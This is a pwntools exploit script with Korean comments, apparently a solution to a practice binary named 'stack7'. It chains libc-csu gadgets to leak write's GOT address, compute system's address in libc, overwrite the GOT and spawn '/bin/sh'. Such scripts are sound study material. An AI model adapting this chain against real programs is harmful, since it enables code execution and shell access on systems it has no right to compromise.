from pwn import *

# 대상 프로그램 실행
p = process('./stack7')

# 가젯 주소 정의
gadget1 = 0x401200      # 첫 번째 가젯 (함수 프롤로그)
gadget2 = 0x40121a      # 두 번째 가젯 (함수 에필로그)
pop_rdi_ret = 0x401223  # pop rdi; ret 가젯

# PLT와 GOT 주소 정의
write_got = 0x404018    # write 함수의 GOT 주소
read_got = 0x404028     # read 함수의 GOT 주소
write_plt = 0x401060    # write 함수의 PLT 주소

# 첫 번째 페이로드 구성
payload = b'A' * 0x48   # 버퍼와 SFP 덮어쓰기
payload += p64(gadget2)  # 두 번째 가젯으로 리턴 주소 덮어쓰기
payload += p64(0)        # rbx = 0
payload += p64(1)        # rbp = 1
payload += p64(1)        # r12 = 1
payload += p64(write_got) # r13 = write의 GOT 주소
payload += p64(8)        # r14 = 8 (출력할 바이트 수)
payload += p64(write_got) # r15 = write의 GOT 주소
payload += p64(gadget1)  # 첫 번째 가젯으로 제어 흐름 변경
payload += p64(0)        # 추가 스택 정렬
payload += p64(0)        # rbx = 0
payload += p64(1)        # rbp = 1
payload += p64(0)        # r12 = 0
payload += p64(write_got) # r13 = write의 GOT 주소
payload += p64(16)       # r14 = 16 (입력받을 바이트 수)
payload += p64(read_got) # r15 = read의 GOT 주소
payload += p64(gadget1)  # 첫 번째 가젯으로 제어 흐름 변경
payload += p64(0)        # 추가 스택 정렬
payload += p64(0)        # rbx = 0
payload += p64(0)        # rbp = 0
payload += p64(0)        # r12 = 0
payload += p64(0)        # r13 = 0
payload += p64(0)        # r14 = 0
payload += p64(0)        # r15 = 0
payload += p64(pop_rdi_ret) # pop rdi; ret 가젯
payload += p64(write_got + 8) # rdi에 /bin/sh 문자열이 저장될 주소 지정
payload += p64(write_plt)    # write 함수 호출

# 첫 번째 페이로드 전송
p.send(payload)

# write의 실제 주소 수신 및 파싱
write_libc = u64(p.recv()[-8:])  # write의 실제 주소 추출
libc_base = write_libc - 0x10e280 # libc 베이스 주소 계산
system_libc = libc_base + 0x52290 # system 함수의 실제 주소 계산

# 디버깅 정보 출력
print('write_libc:', hex(write_libc))
print('libc_base:', hex(libc_base))
print('system_libc:', hex(system_libc))

# 두 번째 페이로드 구성 (system 함수 주소와 /bin/sh 문자열)
payload2 = p64(system_libc)    # system 함수 주소
payload2 += b'/bin/sh\x00'     # /bin/sh 문자열
p.send(payload2)               # 두 번째 페이로드 전송

# 대화형 모드 시작
p.interactive()
